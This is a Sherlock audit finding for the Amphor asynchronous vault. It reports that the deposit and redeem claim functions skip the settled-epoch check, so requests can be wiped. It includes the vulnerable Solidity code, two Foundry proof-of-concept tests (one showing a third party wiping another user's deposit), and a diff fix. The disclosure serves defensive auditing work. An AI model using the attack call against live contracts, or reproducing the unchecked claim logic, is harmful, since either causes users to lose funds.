---
tags:
  - lang/solidity
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
  - sector/zk
protocol: "[[Amphor]]"
auditors:
  - "[[jennifer37]]"
report: "https://github.com/sherlock-audit/2024-03-amphor-judging"
genome:
  - "[[wrong-condition]]"
  - "[[direct-drain]]"
  - "[[initializer-auth]]"
  - "[[integer-bounds]]"
---
# H-1: Claim functions don't validate if the epoch is settled

- id: 30916
- impact: HIGH
- protocol: [[Amphor]]
- reporter: jennifer37 (Sherlock)
- source: N/A

## Summary


This bug report is about a problem found in the Amphor Protocol, specifically in the claim functions. The issue was discovered by a group of people and is related to the validation of the epoch (a specific time period) being settled. This can lead to loss of funds when claiming requests for the current epoch. Additionally, there is a vulnerability that allows an attacker to wipe other users' requests by using a specific function. The report includes code snippets and a proof of concept to demonstrate the issue. The impact of this bug is considered critical and a recommendation is given to fix it by checking the epoch associated with the request. The protocol team has already fixed the issue. 

## Details

Source: https://github.com/sherlock-audit/2024-03-amphor-judging/issues/72 

## Found by 
CryptoSan, aslanbek, cawfree, eeshenggoh, fugazzi, jennifer37, kennedy1030, mahdikarimi, pynschon, sammy, turvec, whitehair0330, zzykxx
## Summary

Both claim functions fail to validate if the epoch for the request has been already settled, leading to loss of funds when claiming requests for the current epoch. The issue is worsened as `claimAndRequestDeposit()` can be used to claim a deposit on behalf of any account, allowing an attacker to wipe other's requests.

## Vulnerability Detail

When the vault is closed, users can request a deposit, transfer assets and later claim shares, or request a redemption, transfer shares and later redeem assets. Both of these processes store the assets or shares, and later convert these when the epoch is settled. For deposits, the core of the implementation is given by `_claimDeposit()`:

```solidity
function _claimDeposit(
    address owner,
    address receiver
)
    internal
    returns (uint256 shares)
{
    shares = previewClaimDeposit(owner);

    uint256 lastRequestId = lastDepositRequestId[owner];
    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];
    epochs[lastRequestId].depositRequestBalance[owner] = 0;
    _update(address(claimableSilo), receiver, shares);
    emit ClaimDeposit(lastRequestId, owner, receiver, assets, shares);
}

function previewClaimDeposit(address owner) public view returns (uint256) {
    uint256 lastRequestId = lastDepositRequestId[owner];
    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];
    return _convertToShares(assets, lastRequestId, Math.Rounding.Floor);
}

function _convertToShares(
    uint256 assets,
    uint256 requestId,
    Math.Rounding rounding
)
    internal
    view
    returns (uint256)
{
    if (isCurrentEpoch(requestId)) {
        return 0;
    }
    uint256 totalAssets =
        epochs[requestId].totalAssetsSnapshotForDeposit + 1;
    uint256 totalSupply =
        epochs[requestId].totalSupplySnapshotForDeposit + 1;

    return assets.mulDiv(totalSupply, totalAssets, rounding);
}
```

And for redemptions in `_claimRedeem()`:

```solidity
function _claimRedeem(
    address owner,
    address receiver
)
    internal
    whenNotPaused
    returns (uint256 assets)
{
    assets = previewClaimRedeem(owner);
    uint256 lastRequestId = lastRedeemRequestId[owner];
    uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];
    epochs[lastRequestId].redeemRequestBalance[owner] = 0;
    _asset.safeTransferFrom(address(claimableSilo), address(this), assets);
    _asset.transfer(receiver, assets);
    emit ClaimRedeem(lastRequestId, owner, receiver, assets, shares);
}

function previewClaimRedeem(address owner) public view returns (uint256) {
    uint256 lastRequestId = lastRedeemRequestId[owner];
    uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];
    return _convertToAssets(shares, lastRequestId, Math.Rounding.Floor);
}

function _convertToAssets(
    uint256 shares,
    uint256 requestId,
    Math.Rounding rounding
)
    internal
    view
    returns (uint256)
{
    if (isCurrentEpoch(requestId)) {
        return 0;
    }
    uint256 totalAssets = epochs[requestId].totalAssetsSnapshotForRedeem + 1;
    uint256 totalSupply = epochs[requestId].totalSupplySnapshotForRedeem + 1;

    return shares.mulDiv(totalAssets, totalSupply, rounding);
}
```

Note that in both cases the "preview" functions are used to convert and calculate the amounts owed to the user: `_convertToShares()` and `_convertToAssets()` use the settled values stored in `epochs[requestId]` to convert between assets and shares.

However, there is no validation to check if the claiming is done for the current unsettled epoch. If a user claims a deposit or redemption during the same epoch it has been requested, the values stored in `epochs[epochId]` will be uninitialized, which means that `_convertToShares()` and `_convertToAssets()` will use zero values leading to zero results too. The claiming process will succeed, but since the converted amounts are zero, the users will always get zero assets or shares.

This is even worsened by the fact that `claimAndRequestDeposit()` can be used to claim a deposit on behalf of any account. An attacker can wipe any requested deposit from an arbitrary `account` by simply calling `claimAndRequestDeposit(0, account, "")`. This will internally execute `_claimDeposit(account, account)`, which will trigger the described issue.

## Proof of concept

The following proof of concept demonstrates the scenario in which a user claims their own deposit during the current epoch:

```solidity
function test_ClaimSameEpochLossOfFunds_Scenario_A() public {
    asset.mint(alice, 1_000e18);

    vm.prank(alice);
    vault.deposit(500e18, alice);

    // vault is closed
    vm.prank(owner);
    vault.close();

    // alice requests a deposit
    vm.prank(alice);
    vault.requestDeposit(500e18, alice, alice, "");

    // the request is successfully created
    assertEq(vault.pendingDepositRequest(alice), 500e18);

    // now alice claims the deposit while vault is still open
    vm.prank(alice);
    vault.claimDeposit(alice);

    // request is gone
    assertEq(vault.pendingDepositRequest(alice), 0);
}
```

This other proof of concept illustrates the scenario in which an attacker calls `claimAndRequestDeposit()` to wipe the deposit of another account.

```solidity
function test_ClaimSameEpochLossOfFunds_Scenario_B() public {
    asset.mint(alice, 1_000e18);

    vm.prank(alice);
    vault.deposit(500e18, alice);

    // vault is closed
    vm.prank(owner);
    vault.close();

    // alice requests a deposit
    vm.prank(alice);
    vault.requestDeposit(500e18, alice, alice, "");

    // the request is successfully created
    assertEq(vault.pendingDepositRequest(alice), 500e18);

    // bob can issue a claim for alice through claimAndRequestDeposit()
    vm.prank(bob);
    vault.claimAndRequestDeposit(0, alice, "");

    // request is gone
    assertEq(vault.pendingDepositRequest(alice), 0);
}
```

## Impact

CRITICAL. Requests can be wiped by executing the claim in an unsettled epoch, leading to loss of funds. The issue can also be triggered for any arbitrary account by using `claimAndRequestDeposit()`.

## Code Snippet

https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L742-L756

https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L758-L773

## Tool used

Manual Review

## Recommendation

Check that the epoch associated with the request is not the current epoch.

```diff
    function _claimDeposit(
        address owner,
        address receiver
    )
        internal
        returns (uint256 shares)
    {
+       uint256 lastRequestId = lastDepositRequestId[owner];
+       if (isCurrentEpoch(lastRequestId)) revert();
      
        shares = previewClaimDeposit(owner);

-       uint256 lastRequestId = lastDepositRequestId[owner];
        uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];
        epochs[lastRequestId].depositRequestBalance[owner] = 0;
        _update(address(claimableSilo), receiver, shares);
        emit ClaimDeposit(lastRequestId, owner, receiver, assets, shares);
    }
```

```diff
    function _claimRedeem(
        address owner,
        address receiver
    )
        internal
        whenNotPaused
        returns (uint256 assets)
    {
+       uint256 lastRequestId = lastRedeemRequestId[owner];
+       if (isCurrentEpoch(lastRequestId)) revert();
        
        assets = previewClaimRedeem(owner);
-       uint256 lastRequestId = lastRedeemRequestId[owner];
        uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];
        epochs[lastRequestId].redeemRequestBalance[owner] = 0;
        _asset.safeTransferFrom(address(claimableSilo), address(this), assets);
        _asset.transfer(receiver, assets);
        emit ClaimRedeem(lastRequestId, owner, receiver, assets, shares);
    }
```



## Discussion

**sherlock-admin4**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid; high(1)



**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/103.
